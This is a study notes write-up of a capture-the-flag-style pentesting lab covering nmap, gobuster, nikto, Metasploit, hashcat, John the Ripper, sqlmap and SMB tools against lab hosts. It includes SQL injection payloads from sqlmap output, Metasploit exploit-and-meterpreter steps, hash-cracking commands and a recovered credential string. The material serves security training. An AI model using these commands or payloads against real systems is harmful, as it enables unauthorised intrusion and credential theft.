# CC: Pentesting


## Nmap
- nmap: network mapper
- **All these are on the man page "man nmap"**
- Specify ports to scan with -p
- Do ping scan with -sn
- Do UDP scan -sU
- Run default scripts with -sC
- Enable aggressive mode with -A
- Enable OS detection with -O
- Enable version scanning -sV
- "sudo nmap -sS 10.10.139.90", 1 port open: 80
- "sudo nmap -A 10.10.139.90", Apache2 service running, version 2.4.18
- Should appear in the previous output because -A also uses -sC (default scripts), but to see it more clearly use "sudo nmap --script=http-title 10.10.139.90" to get the output: Apache2 Ubuntu Default Page: It works


## Netcat
- Netcat allows users to connect to specific ports and send and receive data, and is popularly used to gain a reverse shell
- **All of these are on the help page "nc --help"**
- Listen to connections with -l
- Enable verbose mode with -v
- Specify port with -p
- Specify a program to execure after you connect to a host -e
- Connect to udp ports with -u


## Gobuster
- Gobuster finds valid directories from a wordlist of possible directories, great for reconnaissance
- **Use "gobuster --help" and "gobuster [command] --help"**
- Use the "dir" command to specify directory/file brute forcing mode
- Use the "dns" command to use dns bruteforcing mode
- The -x flag sets extensions to be used. Found using "gobuster dir --help"
- -w to specify wordlist
- -U to set username for basic authentication
- -P to set password for basic authentication
- -s to set which status codes will be interpreted as valid
- -k to skip ssl certificate verification
- -a to specify a user agent
- -H to specify a http header
- -u to specify URL
- To find the hidden directory we use the 'common.txt' wordlist from dirb: "gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.4.159". We find that the hidden directory is '/secret'
>===============================================================
>Gobuster v3.0.1
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>===============================================================
>[+] Url:            http://10.10.4.159
>[+] Threads:        10
>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
>[+] Status codes:   200,204,301,302,307,401,403
>[+] User Agent:     gobuster/3.0.1
>[+] Timeout:        10s
>===============================================================
>2021/11/24 22:52:04 Starting gobuster
>===============================================================
>/.hta (Status: 403)
>/.htaccess (Status: 403)
>/.htpasswd (Status: 403)
>/index.html (Status: 200)
>/secret (Status: 301)
>/server-status (Status: 403)
>===============================================================
>2021/11/24 22:52:05 Finished
>===============================================================

- To find the hidden file with the xxa extension we simply add "-x xx" to the last command. The only .xxa file that has a 200 response is password.xxa
>root@ip-10-10-130-53:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.4.159 -x xxa
>===============================================================
>Gobuster v3.0.1
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>===============================================================
>[+] Url:            http://10.10.4.159
>[+] Threads:        10
>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
>[+] Status codes:   200,204,301,302,307,401,403
>[+] User Agent:     gobuster/3.0.1
>[+] Extensions:     xxa
>[+] Timeout:        10s
>===============================================================
>2021/11/24 22:57:09 Starting gobuster
>===============================================================
>/.htpasswd (Status: 403)
>/.htpasswd.xxa (Status: 403)
>/.htaccess (Status: 403)
>/.htaccess.xxa (Status: 403)
>/.hta (Status: 403)
>/.hta.xxa (Status: 403)
>/index.html (Status: 200)
>/password.xxa (Status: 200)
>/secret (Status: 301)
>/server-status (Status: 403)
>===============================================================
>2021/11/24 22:57:10 Finished
>===============================================================


## Nikto
- Nikto scans a web server for known vulnerabilities. Used to check for common CVE's and get general information about the web server
- **Use "man nikto"**
- -h to specify URL or host
- -nossl to disable ssl
- -ssl to force ssl
- -id to specify authentication
- -plugins to select plugins. -list-plugins to list all plugins
- Use "nikto -list-plugins | grep apache" and we find the plugin "apacheusers"
- -update to update plugins and databases
- -list-plugins to list all plugins


## Metasploit
- One of the most popular penetration testing frameworks. Contains a database of almost every major CVE that can be used against a machine
- Use `msfconsole --help` for startup options
### Setting Up
- Enter msfconsole and use `help` to see all commands or `help command` to get help on commands
- `search` to search modules
- `use` to use a module
- `info` to display info about module
- `options` to show options about module
- `advanced` to show advanced options
- `show` to show options about certain category
### Selecting a Module
- Use `search eternalblue` and then `use exploit/windows/smb/ms17_010_eternalblue`
- Use `options` to see options
- rhosts
- rport
- `set`
- `set SMBPass username`
- `set SMBUser password`
- arch
- payload
- exploit
- Use `help exploit` to find the -j option
- sessions
- Use `help sessions` to find -i option
### Meterpreter
- Meterpreter is metasploit's control center where you can interact with the machine
- [Meterpreter commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
- Access meterpreter with the `post/multi/manage/shell_to_meterpreter` module
- download
- upload
- ps
- migrate
- ls
- execute
- shell
- search
- cat
- background
### Final Walkthrough
1. `use exploit/multi/http/nostromo_code_exec`
2. `set RHOSTS <victim ip>`
3. `set RPORT <victim port>`
4. `set LHOST <attacker ip>`
5. `background`
6. `use post/multi/manage/shell_to_meterpreter`
7. `set SESSION <nostromo code exec session>`
8. `exploit`
9. If meterpreter doesn't take you directly to the meterpreter console, use `sessions -i <meterpreter session>` to access it
10. Now we have access to the remote pc, and we use `ls /var/nostromo/htdocs` to see that s3cretd1r is the hidden directory
11. Now navigate to s3cretd1r `cd /var/nostromo/htdocs/s3cretd1r` and view the contents of the 'nice' file to get 'Woohoo!'


## Hash Cracking
- When gaining access to a database, look for a users table that may contain usernames and hashed passwords
- It's necessary to crack hashed passwords to gain access to a website or services like ssh
### Salting and Formatting
- Most tools will use the same format, a file with hashes with each hash being separeted by a newline
><hash 1>
>
><hash 2>
>
><hash 3>
- Salts are appented to the has with a colon and the salt
>hash1:salt
>
>hash2:salt
>
>hash3:salt
- Different algorithms treat salts differently
### Hashcat
- One of the most popular hash cracking tools
- Doesn't have auto detection for hashtypes, has [modules](https://hashcat.net/wiki/doku.php?id=example_hashes)
- Use `hashcat --help` and the modules list to answer questions
1. -m sets the mode
2. -a sets attack mode
3. 3 is attack mode number for brute force
4. 17600 is the mode number for SHA3-512
5. Use `hashcat -m 0 -a 3 56ab24c15b72a457069c5ea42fcfc640` to find that the answer is 'happy'
6. The mode number for md4 is 900, so we use `hashcat -m 900 -a 3 4bc9ae2b9236c2ad02d81491dcb51d5f` to try to brute force it, but it takes a long time
7. We can instead use a dictionary attack by downloading the [rockyou wordlist](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwjOudylvcP0AhWKgVwKHUZmDBwQFnoECAYQAQ&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd) and using `hashcat -m 900 -a 0 4bc9ae2b9236c2ad02d81491dcb51d5f rockyou.txt` to get 'nootnoot'
### John the Ripper
- Easy to use, supports different formats of hashes, and is customizable
- There are various versions of john the ripper, we're using the one preinstalled on kali
- Use `john --help` and `john --list=help` for help. Ex. To get a list of formats that are supported use `john --list=formats`
1. --wordlist to specify wordlist
2. --format to specify format of hash
3. --rules to specify rules
4. Download the rockyou wordlist. Create a file and insert the hash in it `5d41402abc4b2a76b9719d911017c592`. Find which format you want to use with `john --list=formats | grep -i md5`. Then run `john --wordlist=rockyou --format=raw-md5 fileName`, and we get 'hello'
5. Create a file and insert the hash into it `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8`. Find which format you want to use with `john --list=formats | grep -i sha1`. Then run `john --wordlist=rockyou --format=raw-sha1 fileName`, and we get 'password'


## SQL Injection
- Art of modifying a SQL query so you can get access to that target's database
- Is one of the most common web vulnerabilities and is highly worth checking for
### sqlmap
- The most popular automated SQL injection tool
- Use `man sqlmap` and `sqlmap --help` to answer these questions
1. -u
2. -g
3. -p
4. --dbms
5. --level
6. --dump
7. -D
8. -T
9. -C
10. --os-shell
11. --dump-all
- Sometimes you won't be able to use sqlmap if the target has a firewall set up or a request limit; in this cause you should know how to do a manual SQL injection
1. If we navigate to the page we see that it as a form, so we use the --form option to automatically configure sqlmap. We run it and find 3 vulnerabilities
>root@ip-10-10-110-172:~# sqlmap --form -u http://10.10.148.149
>        ___
>       __H__
> ___ ___[.]_____ ___ ___  {1.2.4#stable}
>|_ -| . ["]     | .'| . |
>|___|_  [.]_|_|_|__,|  _|
>      |_|V          |_|   http://sqlmap.org
>
>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
>
>[*] starting at 00:51:05
>
>[00:51:05] [INFO] testing connection to the target URL
>[00:51:05] [INFO] searching for forms
>[#1] form:
>POST http://10.10.148.149:80/
>POST data: msg=
>do you want to test this form? [Y/n/q] 
>> y
>Edit POST data [default: msg=] (Warning: blank fields detected): 
>do you want to fill blank fields with random values? [Y/n] 
>[00:51:12] [INFO] using '/root/.sqlmap/output/results-12042021_1251am.csv' as the CSV results file in multiple targets mode
>sqlmap resumed the following injection point(s) from stored session:
>---
>Parameter: msg (POST)
>    Type: boolean-based blind
>    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
>    Payload: msg=HSvC' RLIKE (SELECT (CASE WHEN (4669=4669) THEN 0x48537643 ELSE 0x28 END))-- fhki
>
>    Type: error-based
>    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
>    Payload: msg=HSvC' OR (SELECT 8922 FROM(SELECT COUNT(*),CONCAT(0x7178716271,(SELECT (ELT(8922=8922,1))),0x7162706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Hnip
>
>    Type: AND/OR time-based blind
>    Title: MySQL >= 5.0.12 OR time-based blind
>    Payload: msg=HSvC' OR SLEEP(5)-- oPLL
>---
>do you want to exploit this SQL injection? [Y/n] n
>[00:53:08] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-12042021_1251am.csv'
>
>[*] shutting down at 00:53:08
2. Use --dump: `sqlmap --form --dump -u http://10.10.148.149` and we find that the name of the database is 'tests' and there are 2 tables


## Samba
- Samba is very common when pentesting Windows
### Smbmap
- Allows pentesters to run commands, download and uplaod files, and is great for enumeration
- Use `smbmap --help` to answer these questions
1. -u
2. -p
3. -H
4. -x
5. -s
6. -d
7. --download
8. --upload
9. `smbmap -u "admin" -p "password" -H "10.10.10.10" -x "ifconfig"`
### Smbclient
- Use `smbclient --help` and `man smbclient`
1. -W
2. -I
3. -c "ipconfig"
4. -U
5. -P (This is actually incorrect, but is necessary to compete the room)
6. -N
7. `get test`
8. `put /etc/hosts`
### Impacket
- Is a collection of extremely useful windows scripts
- Has scripts that use samba to enumerate and even gain shell access to windows macines
- All scripts found [here](https://github.com/SecureAuthCorp/impacket)


## Privilege Escalation
- Many resources
1. General
   - [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)
2. Linux
   - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
   - https://github.com/rebootuser/LinEnum
   - https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh
   - https://github.com/mzet-/linux-exploit-suggester
   - https://gtfobins.github.io/
3. Windows
   - https://www.fuzzysecurity.com/tutorials/16.html
   - https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
   - https://github.com/411Hall/JAWS


## Final Exam
1. Run nmap: `sudo nmap --script=vuln -A -sN 10.10.165.73`. We see that ports 22 (ssh) and 80 (http) are open. Apache is vulnerable, but we Slowloris is a DOS attack, and we want to access the machine, not deny service
>root@ip-10-10-22-104:~# sudo nmap --script=vuln -A -sN 10.10.165.73
>
>Starting Nmap 7.60 ( https://nmap.org ) at 2021-12-04 06:10 GMT
>Nmap scan report for ip-10-10-165-73.eu-west-1.compute.internal (10.10.165.73)
>Host is up (0.00055s latency).
>Not shown: 998 closed ports
>PORT   STATE SERVICE VERSION
>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
>|_http-csrf: Couldn't find any CSRF vulnerabilities.
>|_http-dombased-xss: Couldn't find any DOM based XSS.
>| http-enum: 
>|_  /secret/: Potentially interesting folder
>|_http-server-header: Apache/2.4.18 (Ubuntu)
>| http-slowloris-check: 
>|   VULNERABLE:
>|   Slowloris DOS attack
>|     State: LIKELY VULNERABLE
>|     IDs:  CVE:CVE-2007-6750
>|       Slowloris tries to keep many connections to the target web server open and hold
>|       them open as long as possible.  It accomplishes this by opening connections to
>|       the target web server and sending a partial request. By doing so, it starves
>|       the http server's resources causing Denial Of Service.
>|       
>|     Disclosure date: 2009-09-17
>|     References:
>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
>|_      http://ha.ckers.org/slowloris/
>|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
>MAC Address: 02:A1:6C:08:61:99 (Unknown)
>Device type: general purpose
>Running: Linux 3.X
>OS CPE: cpe:/o:linux:linux_kernel:3.13
>OS details: Linux 3.13
>Network Distance: 1 hop
>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
>
>TRACEROUTE
>HOP RTT     ADDRESS
>1   0.55 ms ip-10-10-165-73.eu-west-1.compute.internal (10.10.165.73)
>
>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
>Nmap done: 1 IP address (1 host up) scanned in 424.51 seconds
2. Run gobuster on the website: `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.165.73`. We see that there's an interesting folder called "secret"
>root@ip-10-10-22-104:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.165.73
>===============================================================
>Gobuster v3.0.1
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>===============================================================
>[+] Url:            http://10.10.165.73
>[+] Threads:        10
>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
>[+] Status codes:   200,204,301,302,307,401,403
>[+] User Agent:     gobuster/3.0.1
>[+] Timeout:        10s
>===============================================================
>2021/12/04 06:05:57 Starting gobuster
>===============================================================
>/.hta (Status: 403)
>/.htpasswd (Status: 403)
>/.htaccess (Status: 403)
>/index.html (Status: 200)
>/secret (Status: 301)
>/server-status (Status: 403)
>===============================================================
>2021/12/04 06:05:57 Finished
>===============================================================
3. Run gobuster on the secret folder: `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.165.73/secret`. All we find is an index.html, which is completely blank
>root@ip-10-10-22-104:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.165.73/secret
>===============================================================
>Gobuster v3.0.1
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>===============================================================
>[+] Url:            http://10.10.165.73/secret
>[+] Threads:        10
>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
>[+] Status codes:   200,204,301,302,307,401,403
>[+] User Agent:     gobuster/3.0.1
>[+] Timeout:        10s
>===============================================================
>2021/12/04 06:06:15 Starting gobuster
>===============================================================
>/.hta (Status: 403)
>/.htpasswd (Status: 403)
>/.htaccess (Status: 403)
>/index.html (Status: 200)
>===============================================================
>2021/12/04 06:06:16 Finished
>===============================================================
4. Let's see if there are any txt files in the secret directory: `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.165.73/secret -x .txt`. We see that there's a file called "secret.txt"
>root@ip-10-10-22-104:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.165.73/secret -x .txt
>===============================================================
>Gobuster v3.0.1
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>===============================================================
>[+] Url:            http://10.10.165.73/secret
>[+] Threads:        10
>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
>[+] Status codes:   200,204,301,302,307,401,403
>[+] User Agent:     gobuster/3.0.1
>[+] Extensions:     txt
>[+] Timeout:        10s
>===============================================================
>2021/12/04 06:53:58 Starting gobuster
>===============================================================
>/.hta (Status: 403)
>/.hta.txt (Status: 403)
>/.htaccess (Status: 403)
>/.htaccess.txt (Status: 403)
>/.htpasswd (Status: 403)
>/.htpasswd.txt (Status: 403)
>/index.html (Status: 200)
>/secret.txt (Status: 200)
>===============================================================
>2021/12/04 06:53:59 Finished
>===============================================================
5. When we navigate to the text file we find `nyan:046385855FC9580393853D8E81F240B66FE9A7B8`. Could this be the username and password for ssh?
